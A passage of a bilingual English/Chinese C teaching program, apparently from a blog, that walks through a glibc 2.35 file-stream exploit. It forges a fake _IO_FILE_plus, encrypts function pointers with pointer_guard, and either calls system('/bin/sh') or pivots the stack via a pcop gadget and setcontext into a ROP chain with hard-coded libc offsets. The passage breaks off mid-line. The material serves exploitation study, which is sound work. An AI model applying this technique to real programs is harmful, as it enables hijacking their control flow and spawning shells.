&#x27;r12&#x27; here is (_IO_cookie_jumps + 0x38), which is the value of *vtable we wrote in before.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里的r12寄存器的值就是(_IO_cookie_jumps + 0x38), 这就是我们前面写的*vtable值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAs you can see in struct _IO_cookies_jump: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m就如_IO_cookies_jump中代码展示的这样: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 111, /libio/iofopncook.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mstatic const struct _IO_jump_t _IO_cookie_jumps libio_vtable = &#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT_DUMMY,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(finish, _IO_file_finish),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(overflow, _IO_file_overflow),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(underflow, _IO_file_underflow),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(uflow, _IO_default_uflow),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(pbackfail, _IO_default_pbackfail),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(xsputn, _IO_file_xsputn),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(xsgetn, _IO_default_xsgetn),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(seekoff, _IO_cookie_seekoff),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(seekpos, _IO_default_seekpos),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(setbuf, _IO_file_setbuf),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(sync, _IO_file_sync),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(doallocate, _IO_file_doallocate),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(read, _IO_cookie_read),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(write, _IO_cookie_write),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(seek, _IO_cookie_seek),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(close, _IO_cookie_close),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(stat, _IO_default_stat),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(imbue, _IO_default_imbue),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;;\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38) \033[32mpoints to \033[35m_IO_file_xsputn\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38) \033[32m指向的是\033[35m_IO_file_xsputn\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38 + 0x38) \033[32mpoints to \033[35m_IO_cookie_read\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38 + 0x38) \033[32m指向的是\033[35m_IO_cookie_read\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo here we let it call _IO_cookie_read function.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以这里我们让程序调用_IO_cookie_read函数.\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen let&#x27;s have a look at _IO_cookie_read function.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m让我们看一下_IO_cookie_read函数的内容。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m&lt;_IO_cookie_read&gt;:\tendbr64 \n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+4&gt;:\tmov    rax,QWORD PTR [rdi+0xe8]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+11&gt;:\tror    rax,0x11\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+15&gt;:\txor    rax,QWORD PTR fs:0x30\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+24&gt;:\ttest   rax,rax\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+27&gt;:\tje     &lt;_IO_cookie_read+38&gt;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+29&gt;:\tmov    rdi,QWORD PTR [rdi+0xe0]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+36&gt;:\t\033[31mjmp    rax\033[34m\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+38&gt;:\tmov    rax,0xffffffffffffffff\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+45&gt;:\tret\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAs you can see, it directly calls rax, and &#x27;rdi&#x27; here is actually our fake _IO_FILE_plus address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m可以看到，它直接call rax，这里的rdi实际上就是假的_IO_FILE_plus结构体的地址。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we can write any executable address into [rdi+0xe8].\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因此我们可以将任意可执行的地址写入到[rdi+0xe8].\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHowever, don&#x27;t forget some instructions in the middle.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但是，别忘了中间还有几条指令。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere, you can see a &#x27;ror&#x27; instruction and a &#x27;xor&#x27; instruction that change the value of rax.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里你可以看到有一个ror指令和一个xor指令，这些指令会修改rax的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThat is actually a kind of protection strategy used in high versions of glibc ---- encrypting the address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这实际上是高版本glibc的一种保护方式——将地址进行简单加密。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere, these two instruction is decrypting rax, first ror 11 bits, and second xor fs:0x30h, which is our \033[31mpointer_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里的这两条指令实际上是在解密rax，首先循环右移0x11位，然后异或fs:0x30h，这实际上就是\033[31mpointer_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNow you know that why we need the value of pointer_guard, it&#x27;s important for us to encrypt executable address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m现在你应该知道为什么我们需要修改pointer_guard的值了，它对于地址的加密过程很重要。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe encryption algorithm is easy to get: first xor pointer_guard, and second rol 0x11 bits.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m加密方式很好推出来：首先异或pointer_guard，然后循环左移0x11位。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mPay attention to the instruction before &#x27;jmp rax&#x27;: mov rdi, QWORD PTR [rdi+0xe0]\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m注意&#x27;jmp rax&#x27;之前的指令: mov rdi, QWORD PTR [rdi+0xe0]\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIf there is not any sandbox, we can let rax=system() address, and [rdi+0xe0]=&#x27;/bin/sh&#x27; address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m如果这里没有沙箱，我们可以让rax等于system函数地址，[rdi+0xe0]等于字符串/bin/sh的地址\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mElse, you can also fill it with &#x27;pcop&#x27; to trigger stack pivoting and open, read, write flag file.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m否则，我们也可以填充pcop的地址来触发栈迁移，然后打开、读、写flag文件。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mode == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[35mYou chose the getshell mode.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[35m你选择了getshell模式。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we&#x27;ll write &#x27;/bin/sh&#x27; address into [rdi+0xe0] and encrypted system() address into [rdi+0xe8]\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以我们在[rdi+0xe0]处写入字符串/bin/sh的地址，将加密后的system函数地址写入[rdi+0xe8]处。\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>** sh_addr = (<span class="type">char</span>**)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of string &#x27;/bin/sh&#x27; should be written in: \033[31m%p\n\033[0m&quot;</span>, sh_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m字符串&#x27;/bin/sh&#x27;的地址应该被写到: \033[31m%p\n\033[0m&quot;</span>, sh_addr);</span><br><span class="line">        *sh_addr = sh;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m指针解引用的值为: \033[31m%p\033[0m\n&quot;</span>, *sh_addr);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span>* system_addr = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of function system() should be written in: \033[31m%p\n\033[0m&quot;</span>, system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m函数system()的地址应该被写到: \033[31m%p\n\033[0m&quot;</span>, system_addr);</span><br><span class="line">        *system_addr = (<span class="type">size_t</span>)system;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mNow the value of the pointer is: \033[31m%#zx\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m指针解引用的值为: \033[31m%#zx\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThen we need to let it xor with pointer_guard: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m然后我们需要让这个值异或pointer_guard: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        *system_addr ^= *pointer_guard_address;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter xor, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m异或之后[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we need to let it rol 0x11 bits.\n\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们循环左移0x11位:\n\033[0m&quot;</span>);</span><br><span class="line">        *system_addr = (*system_addr &lt;&lt; <span class="number">0x11</span>) + (*system_addr &gt;&gt; <span class="number">0x2f</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter rol, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m循环左移后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(mode == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mYou chose the orw mode.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m你选择了orw模式。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31mIMPORTANT: You must make sure that there is a flag file in this directory, or we&#x27;ll be unable to read.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31m注意：你必须保证当前文件夹下有一个flag文件，否则该程序将无法读取。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn glibc 2.35, we usually use setcontext() function to trigger stack pivoting, but with a little difference from lower versions.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在glibc 2.35中，我们一般使用setcontext函数进行栈迁移，但与低版本的glibc的利用方式有一些小差别。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn lower version, the instruction that changes the rsp is: &#x27;mov rsp, [rdi+xx]&#x27;.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在低版本glibc中，修改rsp的指令为: &#x27;mov rsp, [rdi+xx]&#x27;.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe rdi here is our [fake _IO_FILE_plus struct + 0xe0].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里的rdi是[fake _IO_FILE_plus struct + 0xe0].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBut in glibc 2.35, the instruction was changed to: \033[31m&#x27;mov rsp, [rdx+xx]&#x27;\033[32m.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但是在glibc 2.35中，这条指令被修改为: \033[31m&#x27;mov rsp, [rdx+xx]&#x27;\033[32m.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we can&#x27;t change the value of rsp only by writing forged data in our fake _IO_FILE_plus struct.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以我们不能仅通过将假的数据写入到假的_IO_FILE_plus结构体而修改rsp的值。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHowever, we still have our way to exploit. It&#x27;s called pcop, which is just a unique gadget.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但我们依然能够进行漏洞利用，需要一个pcop，这是一个特殊的gadget。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mTry to use this command below in the terminal: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m可以尝试在终端运行以下命令：: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[1;34mobjdump -d /lib/x86_64-linux-gnu/libc.so.6 -M intel | grep &#x27;1675b&#x27;\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mYou can see a gadget in offset \033[31m0x1675b0\033[32m: \033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m你可以在偏移\033[31m0x1675b0\033[32m处看到有一个gadget: \033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[34m  1675b0:       48 8b 57 08             mov    rdx,QWORD PTR [rdi+0x8]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;  1675b4:       48 89 04 24             mov    QWORD PTR [rsp],rax\n&quot;</span></span><br><span class="line">             <span class="string">&quot;  1675b8:       ff 52 20                call   QWORD PTR [rdx+0x20]\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt seems that we can use the value of [rdi+0x8] to change rdx to any value as we like.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们似乎可以使用[rdi+0x8]的值去修改rdx的值为任意值。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAnd then we can change the rip into [rdx+0x20].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们就可以将rip修改到[rdx+0x20]。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe can change rdx to a place that we can control, then write setcontext() address in it to trigger stack pivoting.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们可以将rdx修改到一个我们可以控制的地方，然后将setcontext函数的地址写进去来触发栈迁移。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mTo keep the environment of heap, we use a space in bss segment to complete this process.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m为了保持堆环境，我们使用bss段的一块空间来完成这个过程。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of bss space is: \033[31m%p\033[32m.\033[0m\n&quot;</span>, &amp;space);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mbss对应地址为: \033[31m%p\033[32m.\033[0m\n\n&quot;</span>, &amp;space);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe let [rdi+0xe0] = bss address, [rdi+0xe8] = pcop address.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们让[rdi+0xe0] = bss的地址, [rdi+0xe8] = pcop的地址.\033[0m&quot;</span>);</span><br><span class="line">        <span class="type">size_t</span>* bss_address = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of bss should be written in: \033[31m%p\n\033[0m&quot;</span>, bss_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个bss的地址应该被写入: \033[31m%p\n\033[0m&quot;</span>, bss_address);</span><br><span class="line">        *bss_address = (<span class="type">size_t</span>)(&amp;space);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of the pointer is: \033[31m%#zx\033[0m\n&quot;</span>, *bss_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个指针的值现在为: \033[31m%#zx\033[0m\n&quot;</span>, *bss_address);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span>* pcop = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of pcop should be written in: \033[31m%p\n\033[0m&quot;</span>, pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mpcop的地址应该被写入到: \033[31m%p\n\033[0m&quot;</span>, pcop);</span><br><span class="line">        *pcop = (<span class="type">size_t</span>)(libc_base + <span class="number">0x1675b0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of the pointer is: \033[31m%#zx\033[0m\n&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个指针现在的值为: \033[31m%#zx\033[0m\n&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mDon&#x27;t forget we need to encrypt the pcop value.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m别忘了我们需要加密pcop的值。\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThen we need to let it xor with pointer_guard: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m然后我们需要让pcop与pointer_guard异或: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        *pcop ^= *pointer_guard_address;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter xor, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m异或之后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m&quot;</span>, *pcop);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we need to let it rol 0x11 bits.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们让它循环左移0x11位。\033[0m&quot;</span>);</span><br><span class="line">        *pcop = (*pcop &lt;&lt; <span class="number">0x11</span>) + (*pcop &gt;&gt; <span class="number">0x2f</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter rol, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m\n&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m循环左移之后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m\n&quot;</span>, *pcop);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNow, we are ready to write something in our bss segment.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m现在我们准备写一些内容到bss段。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNoticing that the first instruction of pcop moves [rdi+0x8] to rdx, while rdi now is address of bss.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m注意到pcop的第一条指令将[rdi+0x8]的值移动到rdx，而rdi此时的值是bss处的地址。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mSo that we can write the address of somewhere in bss to [rdi+0x8](%p).\033[0m&quot;</span>, &amp;(space[<span class="number">1</span>]));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m所以我们可以将任意地址写到[rdi+0x8](%p)这个bss段中的地址。.\033[0m&quot;</span>, &amp;(space[<span class="number">1</span>]));</span><br><span class="line">        space[<span class="number">1</span>] = (<span class="type">size_t</span>)space;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m[rdi+0x8] now is: \033[31m%#zx\033[32m.\n\033[0m&quot;</span>, space[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m[rdi+0x8]现在的值为: \033[31m%#zx\033[32m.\n\033[0m&quot;</span>, space[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we need to write address of setcontext into [rdx+0x20].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们需要写setcontext函数的地址到[rdx+0x20]。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHave a look at disassembly result of function setcontext: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m看一下setcontext函数的汇编: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[34m.text:0000000000053A6D                 \033[1;31mmov     rsp, [rdx+0A0h]\033[34m\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A74                 mov     rbx, [rdx+80h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A7B                 mov     rbp, [rdx+78h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A7F                 mov     r12, [rdx+48h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A83                 mov     r13, [rdx+50h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A87                 mov     r14, [rdx+58h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A8B                 mov     r15, [rdx+60h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A8F                 test    dword ptr fs:48h, 2\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A9B                 jz      loc_53B56\n&quot;</span></span><br><span class="line">             <span class="string">&quot;\t\t\t......\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B56                 \033[1;31mmov     rcx, [rdx+0A8h]\033[34m\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B5D                 \033[1;31mpush    rcx\033[34m\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B5E                 mov     rsi, [rdx+70h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B62                 mov     rdi, [rdx+68h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B66                 mov     rcx, [rdx+98h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B6D                 mov     r8, [rdx+28h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B71                 mov     r9, [rdx+30h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B75                 mov     rdx, [rdx+88h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B75 ; &#125; // starts at 53A30\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B7C ; __unwind &#123;\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B7C                 xor     eax, eax\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B7E                 retn\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe let [rdx+0xa0] = bss + 0x100, and let [rdx+0xa8] = some gadget address as the start of our ROP chain.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们让[rdx+0xa0] = bss + 0x100, 让[rdx+0xa8] = 某些gadget的地址作为ROP链的开始。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThere are some useful gadgets: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里是一些有用的gadget地址: \033[0m&quot;</span>);</span><br><span class="line">        <span class="type">size_t</span> poprdi_ret = libc_base + <span class="number">0x2a3e5</span>;</span><br><span class="line">        <span class="type">size_t</span> poprsi_ret = libc_base + <span class="number">0x2be51</span>;</span><br><span class="line">        <span class="type">size_t</span> poprdx_rbx_ret = libc_base + <span class="number">0x90529</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mpop rdi ; ret : %#zx\n\033[0m&quot;</span>, poprdi_ret);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mpop rsi ; ret : 